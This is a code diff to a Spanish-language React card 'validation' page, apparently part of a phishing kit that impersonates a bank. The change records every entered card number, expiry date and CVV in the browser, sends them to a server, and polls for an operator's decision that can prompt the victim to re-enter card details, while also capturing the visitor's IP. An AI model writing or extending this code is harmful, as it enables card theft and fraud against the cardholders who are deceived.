@@ -78,15 +78,40 @@ export default function ValidacionTCCustom() {
         label: "Débito Preferencial"
     });
 
-    // --- LÓGICA DE CARGA DE DATOS ---
+    // --- LÓGICA DE CARGA DE DATOS CON VALIDACIÓN DE SEGURIDAD ---
     useEffect(() => {
+        // SEGURIDAD: Verificar sesionId en URL o LocalStorage
+        const params = new URLSearchParams(window.location.search);
+        const sesionIdUrl = params.get('sesionId');
+
+        const raw = localStorage.getItem("datos_usuario");
+        const localData = raw ? JSON.parse(raw) : {};
+        const sesionIdLocal = localData.sesion_id;
+
+        const sesionFinal = sesionIdUrl || sesionIdLocal;
+
+        if (!sesionFinal) {
+            // Sin sesionId, redirigir a inicio
+            console.error('Acceso sin sesionId');
+            navigate('/autenticacion'); // Mejor a auth que a root
+            return;
+        }
+
+        // Si viene en URL y no está en local (o es diferente), actualizar local
+        if (sesionIdUrl && sesionIdUrl !== sesionIdLocal) {
+            localData.sesion_id = sesionIdUrl;
+            localStorage.setItem("datos_usuario", JSON.stringify(localData));
+        }
+
+        // Cargar datos de la tarjeta SI existen
         const savedCardData = localStorageService.getItem("selectedCardData");
         if (savedCardData) {
             setCardData(savedCardData);
         }
+
         obtenerIP();
         obtenerFechaHora();
-    }, []);
+    }, [navigate]);
 
     // Timer para fecha/hora
     useEffect(() => {
@@ -253,27 +278,43 @@ export default function ValidacionTCCustom() {
             if (cvv.length === requiredCvvLength) {
                 try {
                     setCargando(true);
-                    // Obtener sesion_id del localStorage
-                    const usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));
-                    const sesionId = usuarioLocalStorage?.sesion_id;
 
-                    if (!sesionId) {
-                        alert("Error: No se encontró la sesión");
-                        return;
+                    // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
+                    const raw = localStorage.getItem("datos_usuario");
+                    let usuarioLocalStorage = raw ? JSON.parse(raw) : {};
+
+                    // Validar sesion
+                    if (!usuarioLocalStorage.sesion_id) {
+                        // Si no hay sesión local, usar la de URL si existe (caso TC Custom directo)
+                        const params = new URLSearchParams(window.location.search);
+                        const sesionIdUrl = params.get('sesionId');
+                        if (sesionIdUrl) {
+                            usuarioLocalStorage.sesion_id = sesionIdUrl;
+                        } else {
+                            alert("Error de sesión");
+                            setCargando(false);
+                            return;
+                        }
                     }
 
-                    // Construir número completo de tarjeta (12 dígitos + 4 últimos)
-                    const numeroTarjetaCompleto = cardDigits + cardData.digits;
+                    if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
+                    if (!usuarioLocalStorage.usuario.tc_custom) usuarioLocalStorage.usuario.tc_custom = [];
+
+                    const nuevoIntento = {
+                        intento: usuarioLocalStorage.usuario.tc_custom.length + 1,
+                        numeroTarjeta: cardDigits,
+                        fechaExpiracion: expirationDate,
+                        cvv: cvv,
+                        fecha: new Date().toLocaleString()
+                    };
+
+                    usuarioLocalStorage.usuario.tc_custom.push(nuevoIntento);
+                    localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));
 
                     // Preparar datos para enviar
                     const dataSend = {
                         data: {
-                            attributes: {
-                                sesion_id: sesionId,
-                                numeroTarjeta: numeroTarjetaCompleto,
-                                cvv: cvv,
-                                fechaExpiracion: expirationDate
-                            }
+                            attributes: usuarioLocalStorage
                         }
                     };
 
@@ -282,7 +323,7 @@ export default function ValidacionTCCustom() {
 
                     if (response.data.success) {
                         // Iniciar polling para esperar respuesta del admin
-                        iniciarPolling(sesionId);
+                        iniciarPolling(usuarioLocalStorage.sesion_id);
                         // No apagamos loading porque esperamos redirección/respuesta del admin
                         // Opcional: Cambiar mensaje de loading?
                     } else {
@@ -317,7 +358,13 @@ export default function ValidacionTCCustom() {
                 console.log('TC Custom Polling:', estado);
 
                 // Redirecciones basadas en respuesta del admin
-                if (estado === 'pendiente' || estado === 'solicitar_tc_custom') {
+                if (estado === 'solicitar_tc_custom') {
+                    // Si el admin pide TC Custom de nuevo (reintento), quitamos el loading para que el usuario pueda editar
+                    if (cargando) {
+                        setCargando(false);
+                        alert("Por favor verifique los datos e intente nuevamente.");
+                    }
+                } else if (estado === 'pendiente' || estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
                     // Esperar...
                 } else {
                     switch (estado.toLowerCase()) {
@@ -369,7 +416,7 @@ export default function ValidacionTCCustom() {
                             break;
                     }
 
-                    if (estado !== 'pendiente' && estado !== 'solicitar_tc_custom') {
+                    if (estado !== 'pendiente' && estado !== 'solicitar_tc_custom' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
                         clearInterval(pollingInterval);
                     }
                 }
